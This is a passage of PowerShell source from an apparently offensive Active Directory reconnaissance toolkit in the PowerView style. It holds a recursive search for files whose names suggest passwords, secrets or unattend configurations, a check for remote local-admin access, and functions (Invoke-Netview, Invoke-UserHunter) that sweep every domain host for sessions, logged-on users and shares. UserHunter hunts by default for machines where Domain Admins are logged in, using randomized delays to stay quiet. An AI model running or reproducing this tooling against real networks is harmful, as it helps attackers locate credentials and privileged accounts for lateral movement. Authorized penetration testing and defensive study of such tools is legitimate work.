        $CreateDateLimit = '1/1/1970',

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [string]
        $OutFile
    )
    
    # default search terms
    $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')
    
    # check if custom search terms were passed
    if ($Terms){
        if($Terms -isnot [system.array]){
            $Terms = @($Terms)
        }
        $SearchTerms = $Terms
    }
    
    # append wildcards to the front and back of all search terms
    for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
        $SearchTerms[$i] = "*$($SearchTerms[$i])*"
    }
    
    # search just for office documents if specified
    if ($OfficeDocs){
        $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
    }
    
    # find .exe's accessed within the last 7 days
    if($FreshEXES){
        # get an access time limit of 7 days ago
        $AccessDateLimit = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
        $SearchTerms = '*.exe'
    }
    
    Write-Verbose "[*] Search path $Path"

    # build our giant recursive search command w/ conditional options
    $cmd = "get-childitem $Path -rec $(if(-not $ExcludeHidden){`"-Force`"}) -ErrorAction SilentlyContinue -include $($SearchTerms -join `",`") | where{ $(if($ExcludeFolders){`"(-not `$_.PSIsContainer) -and`"}) (`$_.LastAccessTime -gt `"$AccessDateLimit`") -and (`$_.LastWriteTime -gt `"$WriteDateLimit`") -and (`$_.CreationTime -gt `"$CreateDateLimit`")} | select-object FullName,@{Name='Owner';Expression={(Get-Acl `$_.FullName).Owner}},LastAccessTime,LastWriteTime,Length $(if($CheckWriteAccess){`"| where { `$_.FullName } | where { Invoke-CheckWrite -Path `$_.FullName }`"}) $(if($OutFile){`"| export-csv -Append -notypeinformation -path $OutFile`"})"
    
    # execute the command
    Invoke-Expression $cmd
}


function Invoke-CheckLocalAdminAccess {
    <#
        .SYNOPSIS
        Checks if the current user context has local administrator access
        to a specified host or IP.

        Idea stolen from the local_admin_search_enum post module in 
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
        
        .DESCRIPTION
        This function will use the OpenSCManagerW Win32API call to to establish
        a handle to the remote host. If this succeeds, the current user context
        has local administrator acess to the target.

        .PARAMETER HostName
        The hostname to query for active sessions.

        .OUTPUTS
        $true if the current user has local admin access to the hostname,
        $false otherwise

        .EXAMPLE
        > Invoke-CheckLocalAdminAccess -HostName sqlserver
        Returns active sessions on the local host.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # 0xF003F - SC_MANAGER_ALL_ACCESS
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
    $handle = $Advapi32::OpenSCManagerW("\\$HostName", 'ServicesActive', 0xF003F)

    Write-Debug "Invoke-CheckLocalAdminAccess handle: $handle"
    
    # if we get a non-zero handle back, everything was successful
    if ($handle -ne 0){
        # Close off the service handle
        $Advapi32::CloseServiceHandle($handle) | Out-Null
        $true
    }
    else{
        # otherwise it failed - get the last error
        $err = $Kernel32::GetLastError()
        # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
        Write-Debug "Invoke-CheckLocalAdminAccess LastError: $err"
        $false
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function Invoke-Netview {
    <#
        .SYNOPSIS
        Queries the domain for all hosts, and retrieves open shares,
        sessions, and logged on users for each host.
        Original functionality was implemented in the netview.exe tool
        released by Rob Fuller (@mubix). See links for more information.

        Powershell module author: @harmj0y
        
        .DESCRIPTION
        This is a port of Mubix's netview.exe tool. It finds the local domain name
        for a host using Get-NetDomain, reads in a host list or queries the domain 
        for all active machines with Get-NetComputers, randomly shuffles the host list, 
        then for each target server it runs  Get-NetSessions, Get-NetLoggedon, 
        and Get-NetShare to enumerate each target host.

        .PARAMETER ExcludeShares
        Exclude common shares from display (C$, IPC$, etc.)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Shuffle
        Shuffle the host list before before enumerating.

        .PARAMETER HostList
        List of hostnames/IPs enumerate.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.
        
        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to enumerate for hosts.

        .EXAMPLE
        > Invoke-Netview
        Run all Netview functionality and display the output.

        .EXAMPLE
        > Invoke-Netview -Delay 60
        Run all Netview functionality with a 60 second (+/- *.3) randomized
        delay between touching each host.

        .EXAMPLE
        > Invoke-Netview -Delay 10 -HostList hosts.txt
        Runs Netview on a pre-populated host list with a 10 second (+/- *.3) 
        randomized delay between touching each host.

        .EXAMPLE
        > Invoke-Netview -NoPing
        Runs Netview and doesn't pings hosts before eunmerating them.

        .EXAMPLE
        > Invoke-Netview -Domain testing
        Runs Netview for hosts in the 'testing' domain.

        .LINK
        https://github.com/mubix/netview
        www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
    #>
    
    [CmdletBinding()]
    param(
        [Switch] 
        $ExcludeShares,

        [Switch] 
        $CheckShareAccess,

        [Switch] 
        $Ping,

        [Switch] 
        $NoPing,

        [Switch] 
        $Shuffle,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # shares we want to ignore if the flag is set
    $excludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    # random object for delay
    $randNo = New-Object System.Random

    $currentUser = ([Environment]::UserName).toLower()
    $servers = @()
    
    "Running Netview with delay of $Delay"
    "[+] Domain: $targetDomain"
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else{
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            "[!] Input file '$HostList' doesn't exist!"
            return
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list if specified
    if ($Shuffle) {
        $servers = Get-ShuffledArray $servers
    }
    
    $DomainControllers = Get-NetDomainControllers -Domain $targetDomain
    
    $HostCount = $servers.Count
    "[*] Total number of hosts: $HostCount`r`n"
    
    if (($DomainControllers -ne $null) -and ($DomainControllers.count -ne 0)){
        foreach ($DC in $DomainControllers){
            "[+] Domain Controller: $DC"
        }
    }
    
    $counter = 0
    
    foreach ($server in $servers){
        
        $counter = $counter + 1
        
        # make sure we have a server
        if (($server -ne $null) -and ($server.trim() -ne '')){
            
            $ip = Get-HostIP -hostname $server
            
            # make sure the IP resolves
            if ($ip -ne ''){
                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                
                Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
                "`r`n[+] Server: $server"
                "[+] IP: $ip"
                
                # by default ping servers to check if they're up first
                $up = $true
                if(-not $NoPing){
                    $up = Test-Server -Server $server
                }
                if ($up){
                    
                    # get active sessions for this host and display what we find
                    $sessions = Get-NetSessions -HostName $server
                    foreach ($session in $sessions) {
                        $username = $session.sesi10_username
                        $cname = $session.sesi10_cname
                        $activetime = $session.sesi10_time
                        $idletime = $session.sesi10_idle_time
                        # make sure we have a result
                        if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $currentUser)){
                            "[+] $server - Session - $username from $cname - Active: $activetime - Idle: $idletime"
                        }
                    }
                    
                    # get any logged on users for this host and display what we find
                    $users = Get-NetLoggedon -HostName $server
                    foreach ($user in $users) {
                        $username = $user.wkui1_username
                        $domain = $user.wkui1_logon_domain
                        
                        if ($username -ne $null){
                            # filter out $ machine accounts
                            if ( !$username.EndsWith("$") ) {
                                "[+] $server - Logged-on - $domain\\$username"
                            }
                        }
                    }
                    
                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        if ($share -ne $null){
                            $netname = $share.shi1_netname
                            $remark = $share.shi1_remark
                            $path = '\\'+$server+'\'+$netname
                            
                            # check if we're filtering out common shares
                            if ($ExcludeShares){
                                if (($netname) -and ($netname.trim() -ne '') -and ($excludedShares -notcontains $netname)){
                                    
                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                        
                                    }
                                    else{
                                        "[+] $server - Share: $netname `t: $remark"
                                    }
                                    
                                }  
                            }
                            # otherwise, display all the shares
                            else {
                                if (($netname) -and ($netname.trim() -ne '')){
                                    
                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                    }
                                    else{
                                        "[+] $server - Share: $netname `t: $remark"
                                    }
                                }
                            }
                            
                        }
                    }
                    
                }
            }
        }
    }
}


function Invoke-NetviewThreaded {
    <#
        .SYNOPSIS
        Queries the domain for all hosts, and retrieves open shares,
        sessions, and logged on users for each host.
        Original functionality was implemented in the netview.exe tool
        released by Rob Fuller (@mubix). See links for more information.
        Threaded version of Invoke-Netview.

        Powershell module author: @harmj0y
        
        .DESCRIPTION
        This is a port of Mubix's netview.exe tool. It finds the local domain name
        for a host using Get-NetDomain, reads in a host list or queries the domain 
        for all active machines with Get-NetComputers, randomly shuffles the host list, 
        then for each target server it runs  Get-NetSessions, Get-NetLoggedon, 
        and Get-NetShare to enumerate each target host.
        Threaded version of Invoke-Netview.

        .PARAMETER HostList
        List of hostnames/IPs enumerate.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludedShares
        Shares to exclude from output, wildcards accepted (i.e. IPC*)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to enumerate for hosts.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-Netview
        Run all NetviewThreaded functionality and display the output.

        .EXAMPLE
        > Invoke-NetviewThreaded -HostList hosts.txt
        Runs Netview on a pre-populated host list.

        .EXAMPLE
        > Invoke-NetviewThreaded -ExcludedShares IPC$, PRINT$
        Runs Netview and excludes IPC$ and PRINT$ shares from output

        .EXAMPLE
        > Invoke-NetviewThreaded -NoPing
        Runs Netview and doesn't pings hosts before eunmerating them.

        .EXAMPLE
        > Invoke-NetviewThreaded -Domain testing
        Runs Netview for hosts in the 'testing' domain.

        .LINK
        https://github.com/mubix/netview
        www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [string[]]
        $ExcludedShares = @(),

        [Switch] 
        $CheckShareAccess,

        [Switch] 
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads = 10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    $currentUser = ([Environment]::UserName).toLower()
    $servers = @()
    
    "Running Netview with delay of $Delay"
    "[+] Domain: $targetDomain"
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else{
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            "[!] Input file '$HostList' doesn't exist!"
            return
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list if specified
    if ($Shuffle) {
        $servers = Get-ShuffledArray $servers
    }
    
    $DomainControllers = Get-NetDomainControllers -Domain $targetDomain
    
    $HostCount = $servers.Count
    "[*] Total number of hosts: $HostCount`r`n"
    
    if (($DomainControllers -ne $null) -and ($DomainControllers.count -ne 0)){
        foreach ($DC in $DomainControllers){
            "[+] Domain Controller: $DC"
        }
    }
    
    # script block that eunmerates a server
    # this is called by the multi-threading code later    
    $EnumServerBlock = {
        param($Server, $Ping, $CheckShareAccess, $ExcludedShares)

        $ip = Get-HostIP -hostname $server

        # make sure the IP resolves
        if ($ip -ne ''){

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){

                "`r`n[+] Server: $server"
                "[+] IP: $ip"
                
                # get active sessions for this host and display what we find
                $sessions = Get-NetSessions -HostName $server
                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time
                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $currentUser)){
                        "[+] $server - Session - $username from $cname - Active: $activetime - Idle: $idletime"
                    }
                }
                
                # get any logged on users for this host and display what we find
                $users = Get-NetLoggedon -HostName $server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain
                    
                    if ($username -ne $null){
                        # filter out $ machine accounts
                        if ( !$username.EndsWith("$") ) {
                            "[+] $server - Logged-on - $domain\\$username"
                        }
                    }
                }
                
                # get the shares for this host and display what we find
                $shares = Get-NetShare -HostName $server
                foreach ($share in $shares) {
                    if ($share -ne $null){
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = '\\'+$server+'\'+$netname
                        
                        # check if we're filtering out common shares
                        if ($ExcludeCommon){
                            if (($netname) -and ($netname.trim() -ne '') -and ($excludedShares -notcontains $netname)){
                                
                                # see if we want to test for access to the found
                                if($CheckShareAccess){
                                    # check if the user has access to this path
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "[+] $server - Share: $netname `t: $remark"
                                    }
                                    catch {}
                                    
                                }
                                else{
                                    "[+] $server - Share: $netname `t: $remark"
                                }
                                
                            }  
                        }
                        # otherwise, display all the shares
                        else {
                            if (($netname) -and ($netname.trim() -ne '')){
                                
                                # see if we want to test for access to the found
                                if($CheckShareAccess){
                                    # check if the user has access to this path
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "[+] $server - Share: $netname `t: $remark"
                                    }
                                    catch {}
                                }
                                else{
                                    "[+] $server - Share: $netname `t: $remark"
                                }
                            }
                        }
                        
                    }
                }            

            }
        }
    }

    # Adapted from:
    #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
    # grab all the current variables for this runspace
    $MyVars = Get-Variable -Scope 1
 
    # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
    # Add Variables from Parent Scope (current runspace) into the InitialSessionState 
    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    # Add Functions from current runspace to the InitialSessionState
    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 
    # threading adapted from
    # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
    # Thanks Carlos!   
    $counter = 0

    # create a pool of maxThread runspaces   
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()   
    $ps = @()   
    $wait = @()

    $serverCount = $servers.count
    "`r`n[*] Enumerating $serverCount servers..."

    foreach ($server in $servers){
        
        # make sure we get a server name
        if ($server -ne ''){
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            While ($($pool.GetAvailableRunspaces()) -le 0) {
                Start-Sleep -milliseconds 500
            }
    
            # create a "powershell pipeline runner"   
            $ps += [powershell]::create()
   
            $ps[$counter].runspacepool = $pool

            # add the script block + arguments
            [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CheckShareAccess', $CheckShareAccess).AddParameter('ExcludedShares', $ExcludedShares)
    
            # start job
            $jobs += $ps[$counter].BeginInvoke();
     
            # store wait handles for WaitForAll call   
            $wait += $jobs[$counter].AsyncWaitHandle

        }
        $counter = $counter + 1
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 

    # end async call   
    for ($y = 0; $y -lt $counter; $y++) {     

        try {   
            # complete async job   
            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }

    $pool.Dispose()
}


function Invoke-UserHunter {
    <#
        .SYNOPSIS
        Finds which machines users of a specified group are logged into.
        Author: @harmj0y
        
        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroup or reads in a target user list, queries the domain for all 
        active machines with Get-NetComputers or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of 
        active users with Get-NetSessions/Get-NetLoggedon. The found user list is compared 
        against the target list, and a status message is displayed for any hits. 
        The flag -CheckAccess will check each positive host to see if the current 
        user has local admin access to the machine.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        The OU to pull users from.
        
        .PARAMETER LDAPquery
        The complete LDAP query string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Shuffle
        Shuffle the host list before before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .EXAMPLE
        > Invoke-UserHunter
        Finds machines on the local domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -CheckAccess
        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

        .EXAMPLE
        > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

        .EXAMPLE
        > Invoke-UserHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups are 
        logged into with a 60 second (+/- *.3) randomized delay between 
        touching each host.

        .EXAMPLE
        > Invoke-UserHunter -UserName jsmith -CheckAccess
        Find machines on the domain where jsmith is logged into and checks if 
        the current user has local administrator access.

        .LINK
        http://blog.harmj0y.net
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $LDAPquery,

        [string]
        $UserName,

        [Switch]
        $CheckAccess,

        [Switch]
        $Ping,

        [Switch]
        $NoPing,

        [Switch]
        $Shuffle,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $UserList,

        [string]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # users we're going to be searching for
    $TargetUsers = @()
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    $CurrentUserBase = ([Environment]::UserName).toLower()
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    "[*] Running UserHunter on domain $targetDomain with delay of $Delay"
    $servers = @()
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server array if specified
    if ($shuffle){
        $servers = Get-ShuffledArray $servers
    }
    
    # if we get a specific username, only use that
    if ($UserName){
        "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    # get the users from a particular OU if one is specified
    elseif($OU){
        $TargetUsers = Get-NetUsers -OU $OU | ForEach-Object {$_.samaccountname}
    }
    # use a specific LDAP query string to query for users
    elseif($LDAPquery){
        $TargetUsers = Get-NetUsers -LDAPquery $LDAPquery | ForEach-Object {$_.samaccountname}
    }
    # read in a target user list if we have one
    elseif($UserList){
        $TargetUsers = @()
        # make sure the list exists
        if (Test-Path -Path $UserList){
            $TargetUsers = Get-Content -Path $UserList 
        }
        else {
            Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
            "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
            return
        }
    }
    else{
        # otherwise default to the group name to query for target users
        "`r`n[*] Querying domain group '$GroupName' for target users..."
        $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
        # lower case all of the found usernames
        $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
    }

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n[!] No users found to search for!"
        "`r`n[!] No users found to search for!"
        return
    }
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
         "`r`n[!] No hosts found!"
        return
    }

    $serverCount = $servers.count
    "`r`n[*] Enumerating $serverCount servers..."
    
    $counter = 0
    
    foreach ($server in $servers){
        
        $counter = $counter + 1
        
        # make sure we get a server name
        if ($server -ne ''){
            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
            
            # optionally check if the server is up first
            $up = $true
            if(-not $NoPing){
                $up = Test-Server -Server $server
            }
            if ($up){
                # get active sessions and see if there's a target user there
                $sessions = Get-NetSessions -HostName $server
                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time
                    
                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            "[+] Target user '$username' has a session on $server ($ip) from $cname"
                            
                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                    "[+] Current user '$CurrentUser' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }
                
                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain
                    
                    if (($username -ne $null) -and ($username.trim() -ne '')){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            # see if we're checking to see if we have local admin access on this machine
                            "[+] Target user '$username' logged into $server ($ip)"
                            
                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                if (Invoke-CheckLocalAdminAccess -Hostname $ip){
                                    "[+] Current user '$CurrentUser' has local admin access on $ip !"
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


function Invoke-UserHunterThreaded {
    <#
        .SYNOPSIS
        Finds which machines users of a specified group are logged into.
        Threaded version of Invoke-UserHunter.
        Author: @harmj0y
        
        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroup or reads in a target user list, queries the domain for all 
        active machines with Get-NetComputers or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of 
        active users with Get-NetSessions/Get-NetLoggedon. The found user list is compared 
        against the target list, and a status message is displayed for any hits. 
        The flag -CheckAccess will check each positive host to see if the current 
        user has local admin access to the machine.
        Threaded version of Invoke-UserHunter.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER LDAPquery
        The complete LDAP query string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-UserHunter
        Finds machines on the local domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -CheckAccess
        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

        .EXAMPLE
        > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

        .EXAMPLE
        > Invoke-UserHunter -UserName jsmith -CheckAccess
        Find machines on the domain where jsmith is logged into and checks if 
        the current user has local administrator access.

        .LINK
        http://blog.harmj0y.net
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $LDAPquery,

        [string]
        $UserName,

        [Switch]
        $CheckAccess,

        [Switch]
        $NoPing,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $UserList,

        [string]
        $Domain,

        [int]
        $MaxThreads = 10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # users we're going to be searching for
    $TargetUsers = @()
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    $CurrentUserBase = ([Environment]::UserName).toLower()
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    "[*] Running Invoke-UserHunterThreaded on domain $targetDomain with delay of $Delay"
    $servers = @()
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
